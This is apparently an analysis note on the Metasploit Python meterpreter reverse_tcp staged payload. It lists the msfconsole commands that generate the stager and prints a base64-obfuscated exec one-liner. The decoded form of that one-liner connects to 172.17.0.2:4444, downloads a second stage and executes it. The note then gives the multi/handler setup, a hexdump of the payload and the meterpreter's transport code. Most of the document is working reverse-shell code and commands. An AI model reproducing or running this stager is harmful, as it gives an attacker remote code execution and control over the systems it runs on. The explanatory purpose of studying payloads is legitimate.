# python/meterpreter/reverse_tcp (staged payload)

## Stager

### Generate
```
msf5> use python/meterpreter/reverse_tcp
msf5 payload(python/meterpreter/reverse_tcp) > generate -f raw -o stager.py
```

### Result
```python
import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE3Mi4xNy4wLjInLDQ0NDQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKGQseydzJzpzfSkK')))
```

Note: the dict is used to apply py2/3 compatibility with regards to decoding strings

#### Base64 Decoded Content
```python
import socket,struct,time
for x in range(10):
	try:
		s=socket.socket(2,socket.SOCK_STREAM) # 2 = socket.AF_INET
		s.connect(('172.17.0.2',4444))        # connect to target IP
		break
	except:
		time.sleep(5)                         # sleep 5 secs after each try
l=struct.unpack('>I',s.recv(4))[0]        # Read the length of the payload into a 4 byte unsigned integer in native byte order
d=s.recv(l)                               # receive data, bufsize=l
while len(d)<l:
	d+=s.recv(l-len(d))
exec(d,{'s':s})                           # provide the socket file descriptor as global var 's' to payload in d
```

## Payload (meterpreter)
The payload is sent when executing the multi/handler exploit module with the
corresponding payload:
```
msf5> use exploit/multi/handler
msf5 exploit(multi/handler) > set payload python/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 127.0.0.1
msf5 exploit(multi/handler) > set lport 4444
msf5 exploit(multi/handler) > exploit
```

The first 4 bytes contain the length of the payload, i.e. 0xd1fb = 53755 bytes.
The python meterpreter client follows (full contents in file `payload.py`).
```
00000000  00 00 d1 fb                                        ....
00000004  23 21 2f 75 73 72 2f 62  69 6e 2f 70 79 74 68 6f   #!/usr/b in/pytho
00000014  6e 0a 69 6d 70 6f 72 74  20 62 69 6e 61 73 63 69   n.import  binasci
00000024  69 0a 69 6d 70 6f 72 74  20 63 6f 64 65 0a 69 6d   i.import  code.im
...
```

Towards the end of the payload, the meterpreter is invoked using the socket
provided by the stager in variable `s`:
```python
...
_try_to_fork = TRY_TO_FORK and hasattr(os, 'fork')
if not _try_to_fork or (_try_to_fork and os.fork() == 0):
    if hasattr(os, 'setsid'):
        try:
            os.setsid()
        except OSError:
            pass
    if HTTP_CONNECTION_URL and has_urllib:
        transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT,
                http_host=HTTP_HOST, http_referer=HTTP_REFERER, http_cookie=HTTP_COOKIE)
    else:
        # PATCH-SETUP-STAGELESS-TCP-SOCKET #
        transport = TcpTransport.from_socket(s)
    met = PythonMeterpreter(transport)
    # PATCH-SETUP-TRANSPORTS #
    met.run()
```
